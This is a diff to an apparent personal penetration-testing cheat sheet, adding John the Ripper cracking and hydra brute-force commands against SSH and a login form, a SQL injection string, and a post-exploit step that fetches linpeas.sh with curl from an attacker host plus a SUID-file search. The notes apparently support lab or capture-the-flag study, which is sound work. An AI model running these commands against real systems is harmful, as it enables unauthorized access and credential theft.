@@ -27,9 +27,14 @@ flask -> usually jinja2
 ffuf  
 cme - SMB brute force tool  
 
-## hydra:  
-* ``
-ex: ```hydra -l usr -P pass.txt ssh://www.example.com```
+John the ripper - cracking tool
+* `john  --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt jonah.txt`
+
+hydra:  
+```
+hydra -l usr -P pass.txt ssh://www.example.com  
+hydra -l jennifer -P /usr/share/wordlists/rockyou.txt builder -s 8080 http-post-form "/login:j_username=jennifer&j_password=^PASS^&from=&Submit=:Invalid username or password"
+```
 
 # Listeners
 wireshark - self explanitory  
@@ -77,11 +82,6 @@ Exiftool - analyzing metadata
 # Refrance links 
 tbd
 
-# Post exploit
-Exiftool - analyzing meta data
-look for weird configs  
-linpeas.sh big
-
 # SQL
 `' or 1=1 -- -`  
 
@@ -90,6 +90,7 @@ linpeas.sh big
 - dumps off request to site, attempts to do a sqli
 
 # SSH
+`chmod 600 <key>`
 `ssh -L <port>:website:80 <user>@myserver`  
 - port forwarding, allowing access to website from myserver  
 `ssh -R <port>:website:80 <user>@myserver`  
@@ -99,6 +100,14 @@ linpeas.sh big
 # Sockets
 `ss -tulpn` (tcp, udp, listenting only, process using socket, dont respolve service names)  
  
+
+# Post exploit
+Exiftool - analyzing meta data
+look for weird configs  
+linpeas.sh big
+
+1. `curl $ip:1111/linpeas.sh`
+1. `find / -perm -u=s -type f 2>/dev/null` - suid bit finder
 
 
      
